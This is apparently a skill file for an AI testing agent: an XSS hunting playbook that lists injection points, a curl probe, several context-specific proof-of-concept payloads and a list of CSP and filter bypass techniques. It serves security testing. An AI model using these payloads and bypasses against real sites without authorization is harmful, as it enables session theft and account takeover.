---
name: xss
description: Cross-site scripting (XSS) hunting playbook. Use when testing reflected, stored, or DOM XSS in web apps, admin panels, search fields, profile fields, file uploads, or postMessage handlers.
allowed-tools:
  - shell
  - http
  - coverage
  - confirm_finding
  - web_fetch
---

# XSS hunting playbook

Test XSS surgically with curl/http. Confirm execution context (HTML, attribute, JS, SVG, markdown) before escalating.

## 1. Find injection points
- Search/query params, POST body fields, headers (Referer, User-Agent if reflected), cookies, URL fragments (#), file names, SVG uploads.
- Check admin vs user contexts — stored XSS in admin views is often P2.

## 2. Probe with safe markers
Use unique markers to detect reflection without executing in your browser:

```
TARGET="https://app.example.com"
MARKER="pfxss$(date +%s)"
curl -ksS "$TARGET/search?q=${MARKER}<svg/onload=alert(1)>" | grep -F "$MARKER"
```

Try contexts: `<`, `"`, `'`, `\`, `</script>`, event handlers, `javascript:` URLs.

## 3. Context-specific payloads
- HTML: `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`
- Attribute breakout: `" onmouseover=alert(1) x="`
- JS string: `';alert(1)//`
- DOM: `#<img src=x onerror=alert(1)>` when location.hash is written to innerHTML

## 4. CSP / filter bypass
If blocked, try: case variation, HTML entities, mutation XSS polyglots, JSONP gadgets, `<base href>`, import maps, `srcdoc` iframes.

## 5. Confirm
Prove impact: who executes the script (victim/admin), what they can do (session theft, action CSRF). Call `confirm_finding` with VRT category e.g. `Cross-Site Scripting (XSS) > Stored XSS` and CWE-79.
